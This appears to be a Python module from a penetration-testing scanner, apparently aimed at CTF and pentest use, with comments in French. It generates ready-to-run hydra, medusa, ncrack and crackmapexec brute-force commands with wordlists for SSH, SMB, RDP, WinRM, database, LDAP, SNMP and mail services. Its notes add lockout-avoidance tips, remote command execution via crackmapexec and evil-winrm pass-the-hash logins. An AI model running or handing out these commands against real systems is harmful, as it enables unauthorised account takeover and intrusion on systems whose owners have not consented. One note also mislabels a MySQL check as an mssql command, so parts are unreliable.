"""
ChocoScan — Brute Force Helper.

Génère les commandes hydra/medusa/crackmapexec/ncrack optimisées
pour chaque service réseau détecté dans le scan.

Différence avec default_creds.py :
  - default_creds.py : liste les couples user/pass connus (test ciblé)
  - brute_helper.py  : génère des attaques wordlist complètes avec
                       les bons flags, wordlists SecLists et protocoles

Services couverts :
  SSH, FTP, HTTP-Form, HTTP-Basic, HTTPS, SMB, RDP, MySQL, PostgreSQL,
  VNC, Telnet, LDAP, WinRM, MSSQL, MongoDB, Redis, SNMP, SMTP, POP3, IMAP

Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations

from dataclasses import dataclass, field


# ── Modèles ───────────────────────────────────────────────────────────────────

@dataclass
class BruteCommand:
    service:       str
    port:          int
    host:          str
    tool:          str          # "hydra" | "medusa" | "crackmapexec" | "ncrack"
    title:         str
    command:       str
    wordlist_user: str
    wordlist_pass: str
    notes:         list[str] = field(default_factory=list)


@dataclass
class BruteResult:
    host:     str
    commands: list[BruteCommand]
    notes:    list[str] = field(default_factory=list)


# ── Wordlists recommandées ────────────────────────────────────────────────────
#
# Chemins SecLists (apt install seclists / /usr/share/seclists)

WL = {
    "users_top":     "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
    "users_names":   "/usr/share/seclists/Usernames/Names/names.txt",
    "users_unix":    "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt",
    "pass_rockyou":  "/usr/share/wordlists/rockyou.txt",
    "pass_common":   "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt",
    "pass_500":      "/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt",
    "pass_default":  "/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt",
    "pass_http":     "/usr/share/seclists/Passwords/darkweb2017-top10000.txt",
    "snmp_comm":     "/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt",
}


# ── Générateurs par service ───────────────────────────────────────────────────

def _ssh_commands(host: str, port: int) -> list[BruteCommand]:
    return [
        BruteCommand(
            service="SSH", port=port, host=host, tool="hydra",
            title="SSH — Hydra wordlist",
            command=(
                f"hydra -L {WL['users_top']} -P {WL['pass_rockyou']} "
                f"ssh://{host}:{port} -t 4 -V -o ssh_brute.txt"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_rockyou"],
            notes=[
                "-t 4 : limiter les threads (SSH détecte les flood)",
                "-s PORT si port non standard",
                "Essayer d'abord avec default_creds (--default-creds)",
            ],
        ),
        BruteCommand(
            service="SSH", port=port, host=host, tool="medusa",
            title="SSH — Medusa (alternative)",
            command=(
                f"medusa -H hosts.txt -U {WL['users_top']} -P {WL['pass_500']} "
                f"-M ssh -n {port} -t 3 -f"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_500"],
            notes=["-f : stopper à la première trouvaille"],
        ),
    ]


def _ftp_commands(host: str, port: int) -> list[BruteCommand]:
    return [
        BruteCommand(
            service="FTP", port=port, host=host, tool="hydra",
            title="FTP — Hydra (après test anonyme)",
            command=(
                f"hydra -L {WL['users_top']} -P {WL['pass_common']} "
                f"ftp://{host}:{port} -t 10 -V"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_common"],
            notes=[
                "Tester d'abord : ftp {host} (login: anonymous)",
                "Anonymous est souvent activé sur les boxes CTF !",
            ],
        ),
    ]


def _http_basic_commands(host: str, port: int, proto: str = "http") -> list[BruteCommand]:
    return [
        BruteCommand(
            service=f"HTTP-Basic/{proto.upper()}", port=port, host=host, tool="hydra",
            title=f"HTTP Basic Auth — Hydra",
            command=(
                f"hydra -L {WL['users_top']} -P {WL['pass_http']} "
                f"{proto}://{host}:{port}/admin -t 20 -V"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_http"],
            notes=[
                "Adapter le chemin (/admin, /manager, /login...)",
                "Identifier d'abord le chemin protégé (dirbusting)",
            ],
        ),
        BruteCommand(
            service=f"HTTP-Form/{proto.upper()}", port=port, host=host, tool="hydra",
            title="HTTP Form POST — Hydra",
            command=(
                f"hydra -L {WL['users_top']} -P {WL['pass_http']} "
                f"{proto}://{host}:{port} http-post-form "
                f"'/login:username=^USER^&password=^PASS^:Invalid' -t 20 -V"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_http"],
            notes=[
                "Adapter le chemin et les noms de champs au formulaire cible",
                "Le troisième champ est le texte d'échec (string to detect failure)",
                "Utiliser Burp Suite pour capturer la requête exacte",
                "Pour GET : http-get-form au lieu de http-post-form",
            ],
        ),
    ]


def _smb_commands(host: str, port: int) -> list[BruteCommand]:
    return [
        BruteCommand(
            service="SMB", port=port, host=host, tool="crackmapexec",
            title="SMB — CrackMapExec (le plus fiable)",
            command=(
                f"crackmapexec smb {host} -u {WL['users_top']} -p {WL['pass_common']} "
                "--continue-on-success"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_common"],
            notes=[
                "--continue-on-success : ne pas s'arrêter à la première trouvaille",
                "--no-bruteforce : tester user=pass uniquement",
                "CMA détecte et affiche le compte Pwn3d! (admin local) automatiquement",
                "Attention au lockout : --lockout-threshold / tester manuellement d'abord",
            ],
        ),
        BruteCommand(
            service="SMB", port=port, host=host, tool="hydra",
            title="SMB — Hydra (alternative)",
            command=(
                f"hydra -L {WL['users_top']} -P {WL['pass_common']} "
                f"smb://{host} -t 1 -V"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_common"],
            notes=["-t 1 : SMB se lockout vite — limiter les threads"],
        ),
    ]


def _rdp_commands(host: str, port: int) -> list[BruteCommand]:
    return [
        BruteCommand(
            service="RDP", port=port, host=host, tool="hydra",
            title="RDP — Hydra",
            command=(
                f"hydra -L {WL['users_top']} -P {WL['pass_common']} "
                f"rdp://{host}:{port} -t 1 -V"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_common"],
            notes=[
                "-t 1 : NLA peut bloquer rapidement",
                "Vérifier d'abord : nmap -p {port} --script rdp-enum-encryption {host}",
            ],
        ),
        BruteCommand(
            service="RDP", port=port, host=host, tool="ncrack",
            title="RDP — Ncrack (plus stable que hydra pour RDP)",
            command=(
                f"ncrack -U {WL['users_top']} -P {WL['pass_500']} "
                f"rdp://{host}:{port} -T3"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_500"],
            notes=["T3 = timing moyen (1=lent, 5=rapide)"],
        ),
        BruteCommand(
            service="RDP", port=port, host=host, tool="crackmapexec",
            title="RDP — CrackMapExec",
            command=(
                f"crackmapexec rdp {host} -u {WL['users_top']} -p {WL['pass_common']}"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_common"],
            notes=[],
        ),
    ]


def _mysql_commands(host: str, port: int) -> list[BruteCommand]:
    return [
        BruteCommand(
            service="MySQL", port=port, host=host, tool="hydra",
            title="MySQL — Hydra",
            command=(
                f"hydra -l root -P {WL['pass_common']} "
                f"mysql://{host}:{port} -t 4 -V"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_common"],
            notes=[
                "Tester root sans mot de passe d'abord : mysql -h {host} -u root",
                "CrackMapExec : crackmapexec mssql {host} -u root -p '' --no-bruteforce",
            ],
        ),
    ]


def _postgres_commands(host: str, port: int) -> list[BruteCommand]:
    return [
        BruteCommand(
            service="PostgreSQL", port=port, host=host, tool="hydra",
            title="PostgreSQL — Hydra",
            command=(
                f"hydra -l postgres -P {WL['pass_common']} "
                f"postgres://{host}:{port} -t 4 -V"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_common"],
            notes=[
                "Tester postgres/postgres et postgres/(vide) d'abord",
                "psql -h {host} -U postgres",
            ],
        ),
    ]


def _mssql_commands(host: str, port: int) -> list[BruteCommand]:
    return [
        BruteCommand(
            service="MSSQL", port=port, host=host, tool="crackmapexec",
            title="MSSQL — CrackMapExec",
            command=(
                f"crackmapexec mssql {host} -u {WL['users_top']} -p {WL['pass_common']}"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_common"],
            notes=[
                "CMA peut aussi exécuter des commandes : --local-auth -x 'whoami'",
                "impacket-mssqlclient DOMAIN/USER:PASS@HOST -windows-auth",
            ],
        ),
        BruteCommand(
            service="MSSQL", port=port, host=host, tool="hydra",
            title="MSSQL — Hydra",
            command=(
                f"hydra -L {WL['users_top']} -P {WL['pass_common']} "
                f"mssql://{host}:{port} -t 4 -V"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_common"],
            notes=[],
        ),
    ]


def _vnc_commands(host: str, port: int) -> list[BruteCommand]:
    return [
        BruteCommand(
            service="VNC", port=port, host=host, tool="hydra",
            title="VNC — Hydra (mot de passe uniquement)",
            command=(
                f"hydra -P {WL['pass_500']} "
                f"vnc://{host}:{port} -t 4 -V"
            ),
            wordlist_user="N/A",
            wordlist_pass=WL["pass_500"],
            notes=[
                "VNC utilise uniquement un mot de passe (pas d'username)",
                "-P uniquement, pas -L",
            ],
        ),
    ]


def _telnet_commands(host: str, port: int) -> list[BruteCommand]:
    return [
        BruteCommand(
            service="Telnet", port=port, host=host, tool="hydra",
            title="Telnet — Hydra",
            command=(
                f"hydra -L {WL['users_top']} -P {WL['pass_common']} "
                f"telnet://{host}:{port} -t 8 -V"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_common"],
            notes=["Telnet est rare en 2024 — souvent admin/admin ou root/root"],
        ),
    ]


def _winrm_commands(host: str, port: int) -> list[BruteCommand]:
    return [
        BruteCommand(
            service="WinRM", port=port, host=host, tool="crackmapexec",
            title="WinRM — CrackMapExec",
            command=(
                f"crackmapexec winrm {host} -u {WL['users_top']} -p {WL['pass_common']}"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_common"],
            notes=[
                "Evil-WinRM dès qu'un compte valide est trouvé :",
                f"evil-winrm -i {host} -u USER -p PASS",
                "Ou avec hash NTLM : evil-winrm -i {host} -u USER -H NTLM_HASH",
            ],
        ),
    ]


def _ldap_commands(host: str, port: int) -> list[BruteCommand]:
    return [
        BruteCommand(
            service="LDAP", port=port, host=host, tool="hydra",
            title="LDAP — Hydra",
            command=(
                f"hydra -L {WL['users_top']} -P {WL['pass_common']} "
                f"ldap2://{host}:{port} -t 4 -V"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_common"],
            notes=[
                "Tester d'abord la liaison anonyme :",
                f"ldapsearch -x -H ldap://{host} -b 'dc=domain,dc=local'",
                "kerbrute peut aussi énumérer les comptes valides sans mot de passe :",
                f"kerbrute userenum -d DOMAIN --dc {host} {WL['users_unix']}",
            ],
        ),
    ]


def _snmp_commands(host: str, port: int) -> list[BruteCommand]:
    return [
        BruteCommand(
            service="SNMP", port=port, host=host, tool="hydra",
            title="SNMP — Brute force community strings",
            command=(
                f"hydra -P {WL['snmp_comm']} "
                f"snmp://{host}:{port} -t 4 -V"
            ),
            wordlist_user="N/A",
            wordlist_pass=WL["snmp_comm"],
            notes=[
                "Tester 'public' et 'private' d'abord :",
                f"snmpwalk -c public -v2c {host}",
                f"onesixtyone -c {WL['snmp_comm']} {host}",
            ],
        ),
    ]


def _smtp_commands(host: str, port: int) -> list[BruteCommand]:
    return [
        BruteCommand(
            service="SMTP", port=port, host=host, tool="hydra",
            title="SMTP — Hydra (après enum users avec VRFY/RCPT)",
            command=(
                f"hydra -L {WL['users_top']} -P {WL['pass_common']} "
                f"smtp://{host}:{port} -t 8 -V"
            ),
            wordlist_user=WL["users_top"],
            wordlist_pass=WL["pass_common"],
            notes=[
                "Énumérer les comptes valides d'abord :",
                f"smtp-user-enum -M VRFY -U {WL['users_unix']} -t {host}",
                "Ou : nmap -p 25 --script smtp-enum-users {host}",
            ],
        ),
    ]


# ── Dispatch par service ──────────────────────────────────────────────────────

_SERVICE_HANDLERS: dict[str, tuple[list[str | int], object]] = {
    "ssh":        ([22],             _ssh_commands),
    "ftp":        ([21],             _ftp_commands),
    "http":       ([80, 8080, 8000], lambda h, p: _http_basic_commands(h, p, "http")),
    "https":      ([443, 8443],      lambda h, p: _http_basic_commands(h, p, "https")),
    "microsoft-ds": ([445, 139],     _smb_commands),
    "netbios-ssn":  ([445, 139],     _smb_commands),
    "smb":        ([445],            _smb_commands),
    "ms-wbt-server": ([3389],        _rdp_commands),
    "rdp":        ([3389],           _rdp_commands),
    "mysql":      ([3306],           _mysql_commands),
    "postgresql": ([5432],           _postgres_commands),
    "ms-sql":     ([1433],           _mssql_commands),
    "mssql":      ([1433],           _mssql_commands),
    "vnc":        ([5900, 5901],     _vnc_commands),
    "telnet":     ([23],             _telnet_commands),
    "winrm":      ([5985, 5986],     _winrm_commands),
    "ldap":       ([389, 636, 3268], _ldap_commands),
    "snmp":       ([161, 162],       _snmp_commands),
    "smtp":       ([25, 587],        _smtp_commands),
}


def _match_service(svc_name: str, port: int) -> str | None:
    """Retourne la clé de service normalisée."""
    svc_lower = svc_name.lower()

    # Correspondance par nom de service
    for key in _SERVICE_HANDLERS:
        if key in svc_lower:
            return key

    # Correspondance par port
    for key, (ports, _) in _SERVICE_HANDLERS.items():
        if port in ports:
            return key

    return None


# ── Moteur principal ──────────────────────────────────────────────────────────

def generate_brute_commands(
    results: list[dict],
    target: str = "",
) -> list[BruteResult]:
    """
    Génère les commandes de brute force par host/service détecté.

    Args:
        results: Résultats ChocoScan (liste de dicts avec clé "service").
        target:  Cible principale (pour affichage).

    Returns:
        Liste de BruteResult, un par host.
    """
    # Regrouper par host
    hosts: dict[str, list[dict]] = {}
    for r in results:
        svc = r.get("service", {})
        h = svc.get("host", target) or target
        if h not in hosts:
            hosts[h] = []
        hosts[h].append(svc)

    brute_results: list[BruteResult] = []

    for host, services in hosts.items():
        cmds: list[BruteCommand] = []
        seen: set[tuple] = set()  # Éviter les doublons (host, port, tool)

        for svc in services:
            svc_name = svc.get("service_name", "") or ""
            port     = svc.get("port", 0) or 0

            key = _match_service(svc_name, port)
            if key is None:
                continue

            _, handler = _SERVICE_HANDLERS[key]
            generated = handler(host, port)

            for cmd in generated:
                dedup_key = (host, port, cmd.tool, cmd.title)
                if dedup_key not in seen:
                    seen.add(dedup_key)
                    cmds.append(cmd)

        if cmds:
            notes = [
                "⚠ Toujours vérifier les credentials par défaut AVANT de bruteforcer (--default-creds)",
                "⚠ Attention au lockout — commencer avec les wordlists courtes",
                f"SecLists complet : apt install seclists",
                f"rockyou.txt : gunzip /usr/share/wordlists/rockyou.txt.gz",
            ]
            brute_results.append(BruteResult(host=host, commands=cmds, notes=notes))

    return brute_results
